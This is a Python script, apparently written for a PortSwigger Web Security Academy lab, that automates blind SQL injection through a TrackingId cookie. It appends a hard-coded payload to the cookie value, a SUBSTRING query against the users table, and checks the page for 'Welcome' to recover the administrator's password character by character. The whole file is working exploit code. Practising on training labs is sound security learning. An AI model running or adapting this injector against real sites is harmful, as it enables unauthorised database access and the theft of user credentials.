#!/usr/bin/env python3.12
# cookie_injector_core.py
import inspect
import sys
import logging

import requests
from requests.cookies import RequestsCookieJar
from rich.console import Console

from SQLInjector.custom_errors import CookieInjectorGetResponseError
from SQLInjector.reverse_logger import ReverseLogger, filename_parser

c = Console()

url = "https://0a2100a904f75acc80eb8f0800a5009b.web-security-academy.net/product?productId=7"
code = "' anD (SELECT SUBSTRING(password,18,1) FROM users WHERE username = 'administrator') = 'g'--"
payload_char = "b"
confirm_bytes = b"Welcome"
cookiename = "TrackingId"
password_length = 20

filename, log_filename = filename_parser(log_file_name=__file__)
rev_log = ReverseLogger(
    logger_name=filename,
    log_file_path=log_filename,
    logging_level=logging.INFO,
)
from SQLInjector.reverse_logger import log_error_and_raise_exception, log_error, log_info


class CookieInjector:
    def __init__(self, target_url, confirmation_string, cookie_name):
        self.target_url = target_url
        self.confirmation_string = confirmation_string
        self.cookie_name = cookie_name
        self.passwd_length = None
        self.payload = None
        self.inject_code = None
        self.response = None
        self.cookies = None
        self.html_content = None
        self.crafted_tracking_id_cookie_jar = None
        self.cookie_original_value = None
        self.cookie_injected_value = None
        self.cookie_original_domain = None
        self.cookie_original_path = None
        self.cookie_original_secure = None
        self.cookie_original_http_only = None
        self.discovered_characters = {}

    def get_response(self):
        try:
            if self.cookies is not None:
                self.response = requests.get(self.target_url, cookies=self.cookies)
                info_message = f"Status code: {self.response.status_code}"
                log_info(rev_log, info_message, inspect.currentframe().f_lineno)
                self.cookies = None
            else:
                self.response = requests.get(self.target_url)
                info_message = f"Status code: {self.response.status_code}"
                log_info(rev_log, info_message, inspect.currentframe().f_lineno)
        except (requests.RequestException, requests.exceptions.RequestException) as e:
            error_message = f"Error sending the request: {e}"
            raise CookieInjectorGetResponseError(error_message)

    def print_cookies(self):
        c.print(self.cookies)

    def extract_cookies(self, print_cookies=False):
        self.cookies = self.response.cookies
        if print_cookies:
            self.print_cookies()

    def copy_cookie(self):
        for cookie in self.cookies:
            if cookie.name == self.cookie_name:
                self.cookie_original_value = cookie.value
                self.cookie_injected_value = self.cookie_original_value + self.inject_code.strip()
                self.cookie_original_domain = cookie.domain
                self.cookie_original_path = cookie.path
                self.cookie_original_secure = cookie.secure
                self.cookie_original_http_only = cookie.has_nonstandard_attr('HttpOnly')

    def delete_original_cookie(self):
        del self.cookies[self.cookie_name]

    def create_injected_cookie(self):
        self.crafted_tracking_id_cookie_jar = RequestsCookieJar()
        self.crafted_tracking_id_cookie_jar.set(
            self.cookie_name,
            self.cookie_injected_value,
            domain=self.cookie_original_domain,
            path=self.cookie_original_path,
            secure=self.cookie_original_secure,
        )
        for tracking_id_cookie in self.crafted_tracking_id_cookie_jar:
            tracking_id_cookie.set_nonstandard_attr('HttpOnly', str(self.cookie_original_http_only))

    def update_original_cookie_jar(self):
        self.delete_original_cookie()
        self.create_injected_cookie()
        self.cookies.update(self.crafted_tracking_id_cookie_jar)

    def check_response(self):
        if self.confirmation_string in self.response.content:
            # c.print(self.response, True)
            return True
        else:
            # c.print(self.response, False)
            return False

    def get_crafted_request_response(self):
        self.get_response()
        return self.check_response()

    def run(self, inject_code, passwd_length, payload):
        self.inject_code = inject_code
        self.passwd_length = passwd_length
        self.payload = payload
        try:
            self.get_response()
            self.extract_cookies()
            self.copy_cookie()
            self.update_original_cookie_jar()
            return self.get_crafted_request_response()
        except CookieInjectorGetResponseError as e:
            error_message = f"Request error: {e}."
            c.print(error_message)
            sys.exit(1)
        except KeyboardInterrupt:
            print()
            c.print(self.discovered_characters)
            sys.exit("Bye!")


def main():
    cookie_injector = CookieInjector(url, confirm_bytes, cookiename)
    cookie_injector.run(code, password_length, payload_char)


if __name__ == '__main__':
    main()
